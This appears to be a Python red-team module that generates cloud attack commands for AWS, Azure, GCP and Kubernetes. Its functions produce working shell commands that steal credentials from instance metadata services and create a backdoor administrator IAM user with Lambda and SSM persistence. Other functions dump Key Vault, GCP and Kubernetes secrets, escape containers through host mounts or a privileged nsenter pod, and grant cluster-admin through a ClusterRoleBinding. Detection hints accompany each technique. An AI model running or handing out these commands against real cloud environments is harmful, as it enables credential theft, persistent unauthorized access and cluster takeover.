"""
Cloud environment attack generator — AWS, Azure, GCP, and Kubernetes.
Generates commands for cloud credential theft, lateral movement, and privilege escalation.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

SUPPORTED_PLATFORMS = ("aws", "azure", "gcp", "kubernetes")
SUPPORTED_TECHNIQUES = (
    "aws_imds",
    "aws_enum",
    "aws_persistence",
    "azure_imds",
    "azure_enum",
    "gcp_metadata",
    "gcp_enum",
    "k8s_service_account",
    "k8s_pod_escape",
    "k8s_rbac_abuse",
)


@dataclass
class CloudResult:
    command: str
    technique: str
    platform: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── AWS ────────────────────────────────────────────────────────────────────────

def _aws_imds(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# IMDSv1 (no token required — check if vulnerable):\n"
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && "
        "ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) && "
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\n\n"
        "# IMDSv2 (token-based — always works):\n"
        "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' "
        "-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && "
        "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/) && "
        "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | tee {outfile}\n\n"
        "# Extract credentials and export:\n"
        "export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId credentials.json)\n"
        "export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey credentials.json)\n"
        "export AWS_SESSION_TOKEN=$(jq -r .Token credentials.json)"
    )
    return CloudResult(
        command=cmd,
        technique="aws_imds",
        platform="aws",
        notes=(
            f"Steals IAM role credentials from EC2 Instance Metadata Service. "
            f"IMDSv1 requires no auth — IMDSv2 requires a PUT for token first. "
            f"Credentials written to {outfile}."
        ),
        techniques=["T1552.005"],
        risk="CRITICAL",
        detections=[
            "CloudTrail: GetCallerIdentity or API calls from EC2 instance outside normal hours",
            "IMDS access from unusual process (GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration)",
            "AWS Config: IMDSv1 still enabled (hop-on misconfiguration)",
        ],
    )


def _aws_enum(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# Identity and permissions check:\n"
        "aws sts get-caller-identity\n"
        "aws iam get-user 2>/dev/null || echo 'role-based'\n\n"
        "# Enumerate accessible resources:\n"
        "aws iam list-attached-user-policies --user-name $USER 2>/dev/null\n"
        "aws iam list-groups-for-user --user-name $USER 2>/dev/null\n"
        "aws iam simulate-principal-policy "
        "--policy-source-arn $(aws sts get-caller-identity --query Arn --output text) "
        "--action-names '*' --resource-arns '*' 2>/dev/null | head -50\n\n"
        "# S3 bucket enumeration:\n"
        "aws s3 ls 2>/dev/null\n"
        "aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null\n\n"
        "# EC2 enumeration:\n"
        "aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,PublicIpAddress,State.Name]' --output table 2>/dev/null\n\n"
        "# Lambda functions:\n"
        f"aws lambda list-functions --query 'Functions[].FunctionName' --output text 2>/dev/null | tee {outfile}"
    )
    return CloudResult(
        command=cmd,
        technique="aws_enum",
        platform="aws",
        notes=f"Comprehensive AWS environment enumeration using stolen credentials. Output to {outfile}.",
        techniques=["T1069.003", "T1087.004", "T1526"],
        risk="HIGH",
        detections=[
            "CloudTrail: ListBuckets, DescribeInstances, ListFunctions in rapid succession",
            "GuardDuty: Recon:IAMUser/MaliciousIPCaller",
            "Unusual IAM API calls from known-good credential at unexpected time/region",
        ],
    )


def _aws_persistence(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# Create backdoor IAM user with admin access:\n"
        "aws iam create-user --user-name svc-backup-agent\n"
        "aws iam attach-user-policy --user-name svc-backup-agent "
        "--policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
        "aws iam create-access-key --user-name svc-backup-agent\n\n"
        "# Create Lambda backdoor (runs on schedule):\n"
        "# 1. Package payload as Lambda function zip\n"
        "# 2. aws lambda create-function --function-name sys-monitor ...\n"
        "# 3. aws events put-rule --schedule-expression 'rate(5 minutes)' --name sys-monitor-schedule\n\n"
        "# Add EC2 SSM access (alternative C2 via AWS Systems Manager):\n"
        "aws ssm start-session --target INSTANCE_ID\n\n"
        "# Store exfil data in S3:\n"
        f"aws s3 cp {outfile} s3://TARGET_BUCKET/loot/ --sse AES256"
    )
    return CloudResult(
        command=cmd,
        technique="aws_persistence",
        platform="aws",
        notes="Creates backdoor IAM user and establishes persistence via Lambda/SSM. Requires iam:CreateUser privilege.",
        techniques=["T1136.003", "T1078.004"],
        risk="CRITICAL",
        detections=[
            "CloudTrail: CreateUser + AttachUserPolicy (GuardDuty: Persistence:IAMUser/AnomalousBehavior)",
            "CloudTrail: CreateAccessKey for new user",
            "AWS Config: IAM user created outside approved process",
        ],
    )


# ── Azure ──────────────────────────────────────────────────────────────────────

def _azure_imds(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# Azure Instance Metadata Service:\n"
        "curl -s -H 'Metadata: true' "
        "'http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01&resource=https://management.azure.com/' "
        f"| jq '.' | tee {outfile}\n\n"
        "# Extract token:\n"
        "TOKEN=$(curl -s -H 'Metadata: true' "
        "'http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01&resource=https://management.azure.com/' "
        "| jq -r .access_token)\n\n"
        "# Use token to call Azure Resource Manager:\n"
        "curl -s -H \"Authorization: Bearer $TOKEN\" "
        "https://management.azure.com/subscriptions?api-version=2020-01-01 | jq '.'"
    )
    return CloudResult(
        command=cmd,
        technique="azure_imds",
        platform="azure",
        notes=f"Steals Azure Managed Identity token from IMDS. Works on VMs with MSI enabled. Token to {outfile}.",
        techniques=["T1552.005"],
        risk="CRITICAL",
        detections=[
            "Azure Activity Log: management.azure.com API calls from VM IP outside expected patterns",
            "Microsoft Defender for Cloud: Suspicious activity from VM managed identity",
            "Azure Monitor: IMDS token request spike",
        ],
    )


def _azure_enum(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# With valid token — enumerate subscriptions and resources:\n"
        "az account list 2>/dev/null\n"
        "az account get-access-token 2>/dev/null\n\n"
        "# Resource enumeration:\n"
        "az resource list --output table 2>/dev/null\n"
        "az vm list --output table 2>/dev/null\n"
        "az storage account list --output table 2>/dev/null\n\n"
        "# Key Vault secrets (if access):\n"
        "az keyvault list --output table 2>/dev/null\n"
        "az keyvault secret list --vault-name TARGET_VAULT 2>/dev/null\n"
        "az keyvault secret show --vault-name TARGET_VAULT --name SECRET_NAME 2>/dev/null\n\n"
        "# Service principals:\n"
        f"az ad sp list --output table 2>/dev/null | head -20 | tee {outfile}"
    )
    return CloudResult(
        command=cmd,
        technique="azure_enum",
        platform="azure",
        notes=f"Azure environment enumeration via az CLI. Requires az login or valid token. Output to {outfile}.",
        techniques=["T1069.003", "T1526"],
        risk="HIGH",
        detections=[
            "Azure Activity Log: resource enumeration API calls",
            "Defender for Cloud: Unusual subscription-level enumeration",
            "Key Vault audit log: secret access from unexpected principal",
        ],
    )


# ── GCP ────────────────────────────────────────────────────────────────────────

def _gcp_metadata(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# GCP Instance Metadata Service:\n"
        "curl -s -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token "
        f"| jq '.' | tee {outfile}\n\n"
        "# Extract access token:\n"
        "TOKEN=$(curl -s -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token "
        "| jq -r .access_token)\n\n"
        "# Get scopes and email:\n"
        "curl -s -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email\n\n"
        "# Use token with gcloud:\n"
        "gcloud auth activate-service-account --access-token-file=<(echo $TOKEN) 2>/dev/null || "
        "curl -s -H \"Authorization: Bearer $TOKEN\" "
        "https://cloudresourcemanager.googleapis.com/v1/projects | jq '.'"
    )
    return CloudResult(
        command=cmd,
        technique="gcp_metadata",
        platform="gcp",
        notes=f"Steals GCP service account token from metadata server. 'Metadata-Flavor: Google' header required. Token to {outfile}.",
        techniques=["T1552.005"],
        risk="CRITICAL",
        detections=[
            "GCP Cloud Audit Logs: metadata.google.internal access from unexpected process",
            "GCP Security Command Center: suspicious API calls using instance service account",
            "Token used from external IP (GCP sees SA token used outside project region)",
        ],
    )


def _gcp_enum(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# GCP project and resource enumeration:\n"
        "gcloud projects list 2>/dev/null\n"
        "gcloud compute instances list 2>/dev/null\n"
        "gcloud storage buckets list 2>/dev/null\n\n"
        "# IAM permissions for current SA:\n"
        "gcloud projects get-iam-policy $(gcloud config get-value project) 2>/dev/null\n\n"
        "# Secrets:\n"
        "gcloud secrets list 2>/dev/null\n"
        "gcloud secrets versions access latest --secret=SECRET_NAME 2>/dev/null\n\n"
        "# Service accounts:\n"
        f"gcloud iam service-accounts list 2>/dev/null | tee {outfile}"
    )
    return CloudResult(
        command=cmd,
        technique="gcp_enum",
        platform="gcp",
        notes=f"GCP resource enumeration via gcloud CLI. Requires authenticated service account. Output to {outfile}.",
        techniques=["T1069.003", "T1526"],
        risk="HIGH",
        detections=[
            "GCP Cloud Audit Logs: Admin Activity for listing resources",
            "Unusual SA activity (projects.list, secrets.list) outside business hours",
        ],
    )


# ── Kubernetes ─────────────────────────────────────────────────────────────────

def _k8s_service_account(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# Read service account token (mounted in pod):\n"
        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
        "NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\n"
        "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n"
        "APISERVER=https://kubernetes.default.svc\n\n"
        "# Check permissions:\n"
        "curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" "
        "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews -X POST "
        "-H 'Content-Type: application/json' "
        "-d '{\"spec\":{\"resourceAttributes\":{\"verb\":\"*\",\"resource\":\"*\"}}}'\n\n"
        "# Enumerate pods in current namespace:\n"
        "curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" "
        f"$APISERVER/api/v1/namespaces/$NAMESPACE/pods | jq '.items[].metadata.name' | tee {outfile}\n\n"
        "# List all namespaces (if cluster-admin):\n"
        "curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" "
        "$APISERVER/api/v1/namespaces | jq '.items[].metadata.name'"
    )
    return CloudResult(
        command=cmd,
        technique="k8s_service_account",
        platform="kubernetes",
        notes=(
            f"Reads mounted K8s service account token and uses it to query API server. "
            f"Effectiveness depends on RBAC permissions granted to the SA. Enum to {outfile}."
        ),
        techniques=["T1528", "T1613"],
        risk="HIGH",
        detections=[
            "K8s audit log: API calls from pod SA token (source: pod IP)",
            "Unusual kubectl/curl to kubernetes.default.svc from container",
            "Falco: Read of /var/run/secrets/kubernetes.io/serviceaccount/token by unexpected process",
        ],
    )


def _k8s_pod_escape(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# Check if privileged pod:\n"
        "cat /proc/1/status | grep CapEff\n\n"
        "# Method 1: Mount host filesystem (privileged pod):\n"
        "ls /dev/sd* /dev/nvme* 2>/dev/null\n"
        "mkdir /mnt/hostfs && mount /dev/sda1 /mnt/hostfs\n"
        "chroot /mnt/hostfs bash\n\n"
        "# Method 2: hostPath volume mount — check:\n"
        "mount | grep -v 'type (overlay|proc|sys|tmpfs)'\n\n"
        "# Method 3: Create privileged pod via API (if SA has pod create permission):\n"
        "curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "
        "-H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" "
        "https://kubernetes.default.svc/api/v1/namespaces/default/pods -X POST "
        "-H 'Content-Type: application/json' "
        "-d '{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"escape\"},"
        "\"spec\":{\"hostPID\":true,\"hostNetwork\":true,\"volumes\":[{\"name\":\"host\","
        "\"hostPath\":{\"path\":\"/\"}}],\"containers\":[{\"name\":\"c\",\"image\":\"alpine\","
        "\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"bash\"],"
        f"\"volumeMounts\":[{{\"name\":\"host\",\"mountPath\":\"/host\"}}],"
        "\"securityContext\":{\"privileged\":true}}]}}'"
    )
    return CloudResult(
        command=cmd,
        technique="k8s_pod_escape",
        platform="kubernetes",
        notes="Multiple K8s container escape techniques. Privileged pods, hostPath mounts, or API-based pod creation.",
        techniques=["T1611"],
        risk="CRITICAL",
        detections=[
            "Falco: Privileged pod creation (Privilege Escalation: Privileged Pod Created)",
            "K8s audit: Pod create with hostPID=true or privileged securityContext",
            "Host filesystem mount from container (eBPF-based runtime security)",
        ],
    )


def _k8s_rbac_abuse(outfile: str, lhost: str) -> CloudResult:
    cmd = (
        "# Check cluster roles and bindings:\n"
        "kubectl get clusterrolebindings -o wide 2>/dev/null | grep -v system:\n"
        "kubectl auth can-i --list 2>/dev/null\n\n"
        "# If cluster-admin — dump all secrets:\n"
        "kubectl get secrets --all-namespaces -o json 2>/dev/null | "
        "jq '.items[].data | to_entries[] | select(.key|test(\"token|pass|key|secret\")) "
        "| {key:.key, val:(.value|@base64d)}'\n\n"
        "# Create a ClusterRoleBinding to escalate a low-priv SA:\n"
        "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin "
        "--serviceaccount=default:default 2>/dev/null\n\n"
        "# Extract etcd (if direct access):\n"
        f"ETCDCTL_API=3 etcdctl get / --prefix --keys-only 2>/dev/null | grep secret | tee {outfile}"
    )
    return CloudResult(
        command=cmd,
        technique="k8s_rbac_abuse",
        platform="kubernetes",
        notes=f"Enumerate and abuse Kubernetes RBAC. Dump secrets or escalate via ClusterRoleBinding. Output to {outfile}.",
        techniques=["T1078.001", "T1613"],
        risk="CRITICAL",
        detections=[
            "K8s audit: get/list secrets across namespaces (unusual volume)",
            "ClusterRoleBinding creation (audit log — high-priority alert)",
            "etcd direct access from non-controller-manager process",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "aws_imds": _aws_imds,
    "aws_enum": _aws_enum,
    "aws_persistence": _aws_persistence,
    "azure_imds": _azure_imds,
    "azure_enum": _azure_enum,
    "gcp_metadata": _gcp_metadata,
    "gcp_enum": _gcp_enum,
    "k8s_service_account": _k8s_service_account,
    "k8s_pod_escape": _k8s_pod_escape,
    "k8s_rbac_abuse": _k8s_rbac_abuse,
}


def generate_cloud(
    technique: str,
    outfile: str = "/tmp/cloud_loot.json",
    lhost: str = "192.168.1.100",
) -> CloudResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](outfile, lhost)
